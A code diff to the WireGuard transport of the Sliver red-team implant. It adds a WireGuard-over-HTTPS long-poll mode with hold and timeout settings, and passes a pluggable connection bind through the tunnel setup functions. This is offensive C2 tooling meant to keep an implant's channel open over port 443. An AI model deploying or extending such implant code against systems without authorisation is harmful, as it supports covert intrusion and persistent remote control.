@@ -48,6 +48,7 @@ import (
 
 	"github.com/bishopfox/sliver/implant/sliver/netstack"
 	"golang.org/x/crypto/blake2b"
+	"golang.zx2c4.com/wireguard/conn"
 	"golang.zx2c4.com/wireguard/device"
 	"golang.zx2c4.com/wireguard/tun"
 	"google.golang.org/protobuf/proto"
@@ -73,6 +74,52 @@ var (
 	PingInterval = 2 * time.Minute
 	failedConn   = 0
 )
+
+const (
+	// DefaultWGHTTPSPort is the default HTTPS port for wg+https
+	// connection strings.
+	DefaultWGHTTPSPort = 443
+
+	// DefaultWGHTTPPollInterval is the idle poll interval of the
+	// wg-over-https bind when the URL does not override it.
+	DefaultWGHTTPPollInterval = 10 * time.Second
+
+	// DefaultWGHTTPNetTimeout is the default overall HTTP timeout when
+	// the URL does not override it.
+	DefaultWGHTTPNetTimeout = 30 * time.Second
+
+	// WGHTTPHoldSlack is added to the declared poll interval to compute
+	// the server-side hold the implant must be able to wait out.
+	WGHTTPHoldSlack = 2 * time.Second
+
+	// WGHTTPMaxHoldSeconds caps the server-side hold.
+	WGHTTPMaxHoldSeconds = 50
+
+	// WGHTTPTimeoutSlack is added to the hold to compute the minimum
+	// client HTTP timeout, so the URL override can lengthen but not
+	// undercut the hold.
+	WGHTTPTimeoutSlack = 5 * time.Second
+)
+
+// WGHTTPHoldDuration - How long the server holds a poll open:
+// min(declared interval + 2s, 50s). Must match the server handler.
+func WGHTTPHoldDuration(pollInterval time.Duration) time.Duration {
+	hold := pollInterval + WGHTTPHoldSlack
+	if max := time.Duration(WGHTTPMaxHoldSeconds) * time.Second; max < hold {
+		hold = max
+	}
+	return hold
+}
+
+// WGHTTPClientTimeout - The implant HTTP timeout: at least the server
+// hold plus slack, or the URL's net-timeout when that is longer.
+func WGHTTPClientTimeout(netTimeout time.Duration, pollInterval time.Duration) time.Duration {
+	timeout := WGHTTPHoldDuration(pollInterval) + WGHTTPTimeoutSlack
+	if netTimeout > timeout {
+		timeout = netTimeout
+	}
+	return timeout
+}
 
 const wgEnvelopeSigningSeedPrefix = "env-signing-v1:"
 
@@ -270,8 +317,8 @@ type deviceConfigurator interface {
 }
 
 // getSessKeys - Connect to the wireguard server and retrieve session specific keys and IP
-func getSessKeys(address string, port uint16) error {
-	_, dev, tNet, err := bringUpWGInterface(address, port, wgImplantPrivKey, wgServerPubKey, wgPeerTunIP)
+func getSessKeys(address string, port uint16, bind conn.Bind) error {
+	_, dev, tNet, err := bringUpWGInterface(address, port, wgImplantPrivKey, wgServerPubKey, wgPeerTunIP, bind)
 	if err != nil {
 		return err
 	}
@@ -310,15 +357,21 @@ func getSessKeysWithDevice(dev sessionKeyDevice, tNet netDialer) error {
 
 // WGConnect - Get a wg connection or die trying
 func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
+	return WGConnectWithBind(address, port, newWGUDPBind())
+}
+
+// WGConnectWithBind - Get a wg connection over the given bind, or die
+// trying. WGConnect is this function with the default UDP bind.
+func WGConnectWithBind(address string, port uint16, bind conn.Bind) (net.Conn, *device.Device, error) {
 	if wgSessPrivKey == "" || failedConn > 2 {
-		if err := getSessKeys(address, port); err != nil {
+		if err := getSessKeys(address, port, bind); err != nil {
 			failedConn++
 			return nil, nil, err
 		}
 	}
 
 	// Bring up actual wireguard connection using retrieved keys and IP
-	_, dev, tNet, err := bringUpWGInterface(address, port, wgSessPrivKey, wgSessPubKey, tunAddress)
+	_, dev, tNet, err := bringUpWGInterface(address, port, wgSessPrivKey, wgSessPubKey, tunAddress, bind)
 	if err != nil {
 		failedConn++
 		return nil, nil, err
@@ -352,7 +405,7 @@ func dialDevice(dialer netDialer, dev permanentDevice, network string, address s
 
 // bringUpWGInterface - First creates an inet.af network stack.
 // then creates a Wireguard device/interface and applies configuration
-func bringUpWGInterface(address string, port uint16, implantPrivKey string, serverPubKey string, netstackTunIP string) (tun.Device, *device.Device, *netstack.Net, error) {
+func bringUpWGInterface(address string, port uint16, implantPrivKey string, serverPubKey string, netstackTunIP string, bind conn.Bind) (tun.Device, *device.Device, *netstack.Net, error) {
 	if netstackTunIP == "" {
 		err := errors.New("[wireguard] Cannot connect to empty IP address")
 		return nil, nil, nil, err
@@ -374,7 +427,7 @@ func bringUpWGInterface(address string, port uint16, implantPrivKey string, serv
 	wgLogLevel = device.LogLevelVerbose
 	// {{end}}
 
-	dev := device.NewDevice(tun, newWGUDPBind(), device.NewLogger(wgLogLevel, "[c2/wg] "))
+	dev := device.NewDevice(tun, bind, device.NewLogger(wgLogLevel, "[c2/wg] "))
 	wgConf := bytes.NewBuffer(nil)
 	fmt.Fprintf(wgConf, "private_key=%s\n", implantPrivKey)
 	fmt.Fprintf(wgConf, "public_key=%s\n", serverPubKey)
